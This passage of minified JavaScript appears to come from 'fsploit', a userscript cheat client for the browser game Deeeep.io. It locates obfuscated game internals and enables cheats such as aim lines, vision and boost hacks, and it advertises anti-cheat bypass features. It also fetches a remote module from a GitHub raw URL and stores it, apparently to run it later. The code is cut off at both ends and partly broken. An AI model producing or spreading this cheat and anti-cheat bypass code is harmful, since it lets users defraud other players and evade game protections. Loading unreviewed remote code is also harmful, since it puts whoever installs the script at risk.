currentScene[e])||obfuscatedNameTranslator.viewingGhosts,obfuscatedNameTranslator.entityManager=l.find(e=>void 0!==currentScene[e]?.entitiesList)||obfuscatedNameTranslator.entityManager,obfuscatedNameTranslator.entityManagerProps={};let d=getAllProperties(currentScene[obfuscatedNameTranslator.entityManager]),p=setInterval(()=>{obfuscatedNameTranslator.animalsContainer=l.find(e=>void 0!==currentScene[e]?.children?.[0]?.isHiding)||obfuscatedNameTranslator.animalsContainer,obfuscatedNameTranslator.entityManagerProps.animalsList=d.filter(e=>e.startsWith("_0x")).find(e=>void 0!==currentScene?.[obfuscatedNameTranslator.entityManager]?.[e]?.[0])||obfuscatedNameTranslator.entityManagerProps.animalsList,void 0!==obfuscatedNameTranslator.animalsContainer&&void 0!==obfuscatedNameTranslator.entityManagerProps.animalsList&&clearInterval(p)},1e3);obfuscatedNameTranslator.chatMessages=l.find(e=>"object"==typeof currentScene[e]&&"number"==typeof currentScene[e]?.length)||obfuscatedNameTranslator.chatMessages,obfuscatedNameTranslator.barsLayer=l.find(e=>"object"==typeof currentScene[e]&&currentScene[e]?.zIndex===15)||obfuscatedNameTranslator.barsLayer,obfuscatedNameTranslator.namesLayer=l.find(e=>"object"==typeof currentScene[e]&&currentScene[e]?.zIndex===18)||obfuscatedNameTranslator.namesLayer,obfuscatedNameTranslator.chatContainer=l.find(e=>"object"==typeof currentScene[e]&&currentScene[e]?.zIndex===50)||obfuscatedNameTranslator.chatContainer;let m=getAllProperties(game);obfuscatedNameTranslator.socketManager=m.find(e=>void 0!==game[e]?.sendBytePacket)||obfuscatedNameTranslator.socketManager,quickDisconnect(),betterVision(),aimLine(),clearChat(),boostHacks(),humpbackAutosongs();try{gameState=document.getElementById("app")._vnode.appContext.config.globalProperties.$simpleState.states.find(e=>"game"===e._storeMeta.id)}catch{}s<Date.now()-3e3&&(ui.message.success("fsploit - Loaded client modifications"),s=Date.now())}}catch{}return e.apply(t,a,r)}})};window.addEventListener("load",()=>{setTimeout(()=>{fetch("https://raw.githubusercontent.com/mahdi13377/fsploit-public/main/mainMod.js",()})),GM_setValue("mainModule",e)}).catch(()=>{location.reload()})},1e3);let e=()=>{injector(),applyStyles(),evoTree();let{close:e}=ui.message.success(`fsploit v${fsploitVersion} - Initialized`);setTimeout(()=>{e(),ui.message.info("Brought to you by Vast Softworks LLC.")},3e3)},t="unknown,unknown";try{t=[document.querySelector("head script[type='module'][src*='index']").src.match(/index\.(?<name>[0-9a-z]*)\.js/i).groups.name,document.querySelector("head link[rel='modulepreload'][href*='vendor']").href.match(/vendor\.(?<name>[0-9a-z]*)\.js/i).groups.name,].join(",")}catch{}"9fcb82c9,e40a671d"===t?e():ui.confirm({title:"Untested Deeeep.io version",message:`Anti-cheat bypass features may not work as expected and get your account banned.
					<br>
					Do you want to proceed anyway?
					<br>
					<p style="font-size:smaller;margin-top: 12px;">
						Debug info:
						<span style="background: #0004;border: 1px solid #fff3;padding: 1px 3px;border-radius: 4px;user-select: auto;">
							index: ${t.split(",")[0]}, vendor: ${t.split(",")[1]}
						</span>
					</p>`,dangerouslyUseHTMLString:!0,type:"warning",confirmButtonText:"Yes",cancelButtonText:"No",onConfirm:e,onCancel(){}})});

